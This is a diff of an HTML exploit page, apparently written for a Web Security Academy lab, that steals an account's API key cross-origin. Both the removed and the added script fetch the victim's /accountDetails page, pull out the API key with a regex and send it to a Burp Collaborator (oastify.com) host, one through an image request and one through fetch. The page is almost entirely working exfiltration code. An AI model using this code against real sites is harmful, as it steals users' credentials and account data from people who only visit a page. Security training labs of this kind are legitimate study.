@@ -3,39 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>API Key Extractor</title>
+    <title>Leaking API Key</title>
+    <script>
+        window.onload = function() {
+            // Target URL to fetch the API key
+            const targetUrl = 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails';
+            const burpCollabServer = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com';
+
+            fetch(targetUrl)
+                .then(response => response.text())
+                .then(data => {
+                    // Extract the API key from the response data
+                    const apikey = extractApiKey(data);
+                    if (apikey) {
+                        // Send the API key to the Burp Collaborator server
+                        fetch(`${burpCollabServer}/?apikey=${apikey}`);
+                    }
+                })
+                .catch(error => console.error('Error fetching the API key:', error));
+        };
+
+        function extractApiKey(responseData) {
+            // Regular expression to find the API key in the response data
+            const apiKeyPattern = /apikey=([a-zA-Z0-9]+)/;
+            const match = responseData.match(apiKeyPattern);
+            return match ? match[1] : null;
+        }
+    </script>
 </head>
 <body>
-    <script>
-        // Function to send the API key to your Burp Collaborator server
-        function sendApiKey(apiKey) {
-            const img = new Image();
-            img.src = `https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com/?api_key=${apiKey}`;
-        }
-
-        // Function to fetch data from the target URL and extract the API key
-        async function fetchAndLeakApiKey() {
-            try {
-                const response = await fetch('https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', {
-                    credentials: 'include'
-                });
-                const data = await response.text();
-
-                // Assuming the API key is present in the response text, use a regex to extract it
-                const apiKeyMatch = data.match(/"api_key":"([a-zA-Z0-9-]+)"/);
-                if (apiKeyMatch && apiKeyMatch[1]) {
-                    const apiKey = apiKeyMatch[1];
-                    sendApiKey(apiKey);
-                } else {
-                    console.error('API key not found in the response.');
-                }
-            } catch (error) {
-                console.error('Error fetching the data:', error);
-            }
-        }
-
-        // Call the function to fetch and leak the API key
-        fetchAndLeakApiKey();
-    </script>
+    <h1>Leaking API Key</h1>
+    <p>If you are seeing this page, the API key has been leaked.</p>
 </body>
 </html>
